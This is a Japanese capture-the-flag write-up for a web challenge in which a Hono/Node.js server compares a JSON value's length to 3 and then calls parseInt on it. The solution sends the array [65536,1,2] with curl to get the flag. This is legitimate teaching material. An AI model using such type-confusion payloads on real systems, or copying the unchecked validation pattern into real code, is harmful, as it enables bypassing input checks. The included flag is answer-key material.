# Toolong Tea:web:100pts
最近東京(TSGの拠点)はめっきり寒くなりました。温かい烏龍茶を1杯いかがでしょう。体が温まりますよ。  

初心者向けヒント  
- まず、問題のウェブサイトを開いて適当に操作してみてください。この問題は「65536」という数をサーバーに送信すればフラグが入手できると主張していますが、話はそんなに単純ではないことがすぐに分かります。  
- 次に、添付されたソースコードを読んでみましょう。このウェブサイトの重要なロジックは`server.js`に書かれています。`flag`変数に入ったフラグを漏洩させるのが目標です。  
- このウェブサイトにはフラグを得るのに利用できるバグがあります。探すのにweb技術(特にJavaScript)の知識が必要になるかもしれません。必要ならMDNなどのドキュメントを参照してください。  
- このウェブサイトは通常のNode.jsアプリと同様に(`npm install && node server.js`)、あるいはdocker composeを利用して(`docker compose up --build`)ローカルで動かせます。  
- なお、この問題を解くのに大量アクセスは必要ありません。DoSまがいの大量アクセスはやめてください。  

[http://34.84.32.212:4932](http://34.84.32.212:4932)  

[toolong_tea.tar.gz](toolong_tea.tar.gz)  

# Solution
URLとソースコードが渡される。  
アクセスすると、数字を送信できるページのようだ。  
![site.png](site/site.png)  
機能がわからないので、配布されたserver.jsを見ると以下のようであった。  
```js
import { serve } from "@hono/node-server";
import { serveStatic } from "@hono/node-server/serve-static";
import { Hono } from "hono";

const flag = process.env.FLAG ?? "TSGCTF{DUMMY}";

const app = new Hono();

app.get("*", serveStatic({ root: "./public" }));

app.post("/", async (c) => {
	try {
		const { num } = await c.req.json();
		if (num.length === 3 && [...num].every((d) => /\d/.test(d))) {
			const i = parseInt(num, 10);
			if (i === 65536) {
				return c.text(`Congratulations! ${flag}`);
			}
			return c.text("Please send 65536");
		}
		if (num.length > 3) {
			return c.text("Too long!");
		}
		return c.text("Please send 3-digit integer");
	} catch {
		return c.text("Invalid JSON", 500);
	}
});

serve({
	fetch: app.fetch,
	port: 4932,
});
```
`65536`を送信できればフラグが得られるようだが、`num.length === 3`で3桁の制限がかかっている。  
3桁で`65536`を表せということらしい。  
`const i = parseInt(num, 10);`が怪しいので挙動を思い出すと以下の通り配列では先頭の要素のみが返る。  
```js
$ node
~~~
> parseInt([123, 4, 5])
123
```
数値はJSONで送信するので、`num`として配列を含めることができる。  
もちろん3要素の配列とすれば`length`は3である。  
以下のように先頭を`65536`とした配列を送信する。  
```bash
$ curl -X POST http://34.84.32.212:4932/ -d '{"num": [65536, 1, 2]}'
Congratulations! TSGCTF{A_holy_night_with_no_dawn_my_dear...}
```
flagが得られた。  

## TSGCTF{A_holy_night_with_no_dawn_my_dear...}